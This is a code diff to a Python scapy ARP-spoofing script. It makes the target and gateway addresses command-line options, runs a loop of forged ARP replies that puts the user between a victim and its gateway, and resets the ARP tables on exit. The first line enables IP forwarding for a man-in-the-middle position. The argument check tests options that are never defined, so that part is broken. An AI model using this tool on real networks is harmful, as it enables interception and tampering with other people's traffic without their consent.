@@ -1,6 +1,19 @@
 #echo 1 > /proc/sys/net/ipv4/ip_forward
 import scapy.all as scapy
-import time
+import time, optparse
+
+def get_argument():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target",
+                      help="Target for ARP-spoof")
+    parser.add_option("-g", "--gateway", dest="gateway",
+                      help="Gateaway for ARP-spoof")
+    (options, arguments) = parser.parse_args()
+
+    if not options.interface or not options.new_mac:
+        parser.error(
+            "[-] Specify an Interface use python3 arp-spoof.py --help for more details")
+    return options
 
 
 def get_mac(ip):
@@ -24,8 +37,9 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = "10.0.2.5"
-gateway_ip = "10.0.2.1"
+options = get_argument()
+target_ip = options.target
+gateway_ip = options.gateway
 try:
     sent_packets_count = 0
     while True:
@@ -35,6 +49,6 @@ try:
         print("\r[+] Packets sent: " +  str(sent_packets_count), end='')
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[-] Detected Ctrl+C .... Resetting ARP-tables .... Please wait.\n")
+    print("\n[-] Detected Ctrl+C .... Resetting ARP-tables.\n")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
